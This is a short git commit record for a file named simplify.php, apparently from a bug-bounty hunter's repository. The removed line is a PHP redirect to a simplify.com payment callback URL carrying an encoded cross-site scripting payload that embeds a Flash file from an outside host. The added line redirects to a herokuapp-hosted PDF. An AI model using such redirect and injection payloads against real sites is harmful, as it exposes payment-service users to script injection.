e42a013388dc81046eb7d71e40e739673cb537da
missoum1307 <missoum1307@users.noreply.github.com>
2018-01-07 22:00:53 +0100

    Update simplify.php

--- simplify.php
+++ simplify.php
@@ -1,2 +1,4 @@
-<?php header('location: https://www.simplify.com/commerce/masterPass/callbackHandler?source=&key=%3C?PXML%3E%3Chtml:embed%20allowscriptaccess=always%20src=https:%26%23x2f%3b%26%23x2f%3bl0.cm%26%23x2f%3bxss.swf%3E
+<?php header('location: https://bughunt1307.herokuapp.com/qqq.pdf
 ')?>
+
+
